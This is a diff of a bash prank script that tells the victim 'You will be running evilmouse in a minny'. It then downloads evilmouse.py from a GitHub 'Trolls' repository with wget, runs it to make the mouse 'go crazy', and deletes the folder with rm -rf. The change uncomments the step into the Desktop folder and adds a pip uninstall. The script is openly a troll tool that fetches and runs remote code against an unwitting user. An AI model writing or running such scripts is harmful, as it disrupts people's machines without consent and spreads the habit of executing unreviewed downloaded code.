@@ -1,7 +1,7 @@
 #! /usr/bin/bash
 
 echo "Fuck your life. You will be running evilmouse in a minny"
-# cd "$HOME/Desktop"
+cd "$HOME/Desktop"
 mkdir evilmouse
 cd evilmouse
 wget https://raw.githubusercontent.com/eLVee1991/Trolls/master/evilmouse.py
@@ -15,7 +15,8 @@ echo "Trolling you now. You're fucked for a while. Your mouse will go crazy."
 echo ""
 echo ""
 python3 evilmouse.py
-cd "../"
+pip3 uninstall -r requirements.txt
+cd ".."
 rm -rf evilmouse
 echo ""
 echo ""
